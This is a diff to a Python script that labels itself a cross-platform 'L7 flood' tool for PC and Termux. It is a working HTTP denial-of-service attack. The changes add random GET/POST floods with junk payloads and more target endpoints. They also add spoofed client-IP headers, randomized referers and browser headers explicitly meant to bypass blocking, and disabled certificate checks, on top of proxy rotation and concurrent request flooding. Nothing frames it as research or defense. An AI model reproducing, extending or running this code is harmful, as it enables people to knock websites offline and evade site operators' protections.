@@ -1,4 +1,3 @@
-#ВНИМАНИЕ, ЭТО ПОДДЕРЖИВАЕТ И ТЕРМУКС!!!
 import subprocess
 import sys
 import asyncio
@@ -6,11 +5,14 @@ import random
 import itertools
 import platform
 import os
+import time  # Добавляем импорт time
+import json
+import ssl
 
 def install_dependencies():
     required = {
         'aiohttp': 'aiohttp',
-        'aiohttp_socks': 'aiohttp-socks',
+        'aiohttp_socks': 'aiohttp-socks', 
         'fake_useragent': 'fake-useragent'
     }
     
@@ -62,7 +64,16 @@ async def advanced_flood(target, threads_count, proxy_list=None, platform_config
         
     ua = UserAgent()
     request_count = 0
-    endpoints = ['', 'wp-admin', 'api/v1', 'login', 'static/img', 'data.json']
+    endpoints = ['', 'wp-admin', 'api/v1', 'login', 'static/img', 'data.json', 'user/profile', 'admin/login', 'api/json', 'graphql']
+    
+    # Генератор случайных данных для POST-запросов
+    def generate_random_data():
+        data_types = [
+            lambda: json.dumps({'data': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=random.randint(50, 500)))}),
+            lambda: ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890', k=random.randint(100, 1000))),
+            lambda: '&'.join([f'{random.choice("abcdefghijkl")}={random.randint(1000,9999)}' for _ in range(random.randint(5, 15))])
+        ]
+        return random.choice(data_types)()
     
     if proxy_list and ProxyConnector:
         proxy_cycle = itertools.cycle(proxy_list)
@@ -75,23 +86,58 @@ async def advanced_flood(target, threads_count, proxy_list=None, platform_config
         nonlocal request_count
         try:
             endpoint = random.choice(endpoints)
-            url = f"{target}/{endpoint}?rnd={random.randint(1000,9999)}"
+            url = f"{target}/{endpoint}?rnd={random.randint(1000,9999)}&cache={random.randint(100000,999999)}"
+            
+            # Случайный выбор метода (GET или POST)
+            method = random.choice([session.get, session.post])
+            
+            # Случайные заголовки для обхода блокировок
             headers = {
                 'User-Agent': ua.random,
                 'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
+                'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
+                'X-Client-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                'Connection': 'keep-alive' if random.random() > 0.5 else 'close'
+                'Accept-Language': random.choice(['ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'en-US,en;q=0.9', 'de-DE,de;q=0.9']),
+                'Accept-Encoding': random.choice(['gzip, deflate, br', 'gzip, deflate']),
+                'Connection': random.choice(['keep-alive', 'close']),
+                'Cache-Control': random.choice(['no-cache', 'max-age=0', '']),
+                'Referer': random.choice([f'http://{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}', 
+                                         'https://www.google.com/', 'https://www.bing.com/', 'https://yandex.ru/'])
             }
             
+            # Случайные данные для POST-запросов
+            data = generate_random_data() if method == session.post else None
+            
             timeout = aiohttp.ClientTimeout(total=platform_config['timeout'])
-            async with session.get(url, headers=headers, timeout=timeout) as resp:
-                pass
+            
+            # Создаем собственный SSL-контекст для обхода проверок
+            ssl_context = ssl.create_default_context()
+            ssl_context.check_hostname = False
+            ssl_context.verify_mode = ssl.CERT_NONE
+            
+            if method == session.get:
+                async with method(url, headers=headers, timeout=timeout, ssl=ssl_context) as resp:
+                    pass
+            else:
+                # Для POST-запросов добавляем случайный Content-Type
+                post_headers = headers.copy()
+                post_headers['Content-Type'] = random.choice([
+                    'application/json',
+                    'application/x-www-form-urlencoded',
+                    'text/plain',
+                    'multipart/form-data'
+                ])
+                async with method(url, headers=post_headers, data=data, timeout=timeout, ssl=ssl_context) as resp:
+                    pass
+                    
             request_count += 1
         except Exception as e:
             pass
 
-    print(f"[+] Запуск L7-флуда с {threads_count} потоками")
+    print(f"[+] Запуск улучшенного L7-флуда с {threads_count} потоками")
     print("[+] Платформа: {}".format(detect_platform()))
+    print("[+] Методы: GET/POST со случайными данными")
     print("[+] CTRL+C для остановки")
 
     try:
@@ -116,8 +162,9 @@ async def advanced_flood(target, threads_count, proxy_list=None, platform_config
         print(f"\n[!] Критическая ошибка: {e}")
 
 if __name__ == "__main__":
-    print("[+] Кроссплатформенный L7-флуд v2.0")
+    print("[+] Кроссплатформенный L7-флуд v2.1")
     print("[+] Адаптация для PC/Termux/Android")
+    print("[+] Улучшенный обход блокировок")
     
     current_platform = detect_platform()
     platform_config = optimize_for_platform(current_platform)
